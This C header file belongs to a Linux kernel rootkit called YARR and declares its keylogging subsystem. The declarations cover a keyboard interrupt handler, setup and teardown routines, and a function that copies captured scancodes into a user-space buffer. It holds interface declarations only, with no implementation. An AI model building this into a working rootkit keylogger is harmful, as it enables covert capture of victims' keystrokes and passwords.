/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_I_WILL_DISCOVER_YOUR_TYPOS
#define __YARR_I_WILL_DISCOVER_YOUR_TYPOS

#include <linux/interrupt.h>

// TODO: Bad documentation...
/**
 * The low level interrupt handler, this is the function called when the
 * keyboard generates an interrupt.
 *
 * @irq: The interrupt vector that this function is serving (it should be the
 * keyboard interrupt, IRQ #1 on x86 systems).
 * @dev_id: The device identifier if needed.
 * @regs: Where the CPU status is saved when this function is called.
 * @return: One of the Linux codes of interrupts handlers.
 */
irq_handler_t kbdIRQHandler(int irq, void *dev_id, struct pt_regs *regs);

/**
 * The initializator of all the keylog subsystem, this should be called when
 * yarr is inserted into the kernel.
 */
int init_keylog(void);

/**
 * Should be called when we want to finish the keylogging subsystem. You
 * shouldn't try to use any of this subsystem after calling this function.
 * Not even init_keylog() and think that everything will work, it won't.
 */
void exit_keylog(void);

/**
 * Copies the size last scancodes into buf. Note that, even being the last
 * size scancodes, they are copied in order, this means that buf[0] will
 * contain the oldest scancode and buf[size-1] the youngest one.
 *
 * If yarr has captured less scancodes than size, lets say n being n << size,
 * then the positions in buf from n+1 up to size-1 will be undetermined.
 *
 * @buf: The buffer where to copy the scancodes captured.
 * @size: The maximum size of the buffer.
 * @return: The number of scancodes copied into buf, note that this can be at
 * most size. -1 will be returned if there were errors.
 */
int cpyScanCodes(unsigned char __user *buf, int size);

// TODO: Remove?.
/**
 * Just for debugging purposes.
 */
void print_scancodes(void);
void print_keys(void);

#endif /* __YARR_I_WILL_DISCOVER_YOUR_TYPOS. */

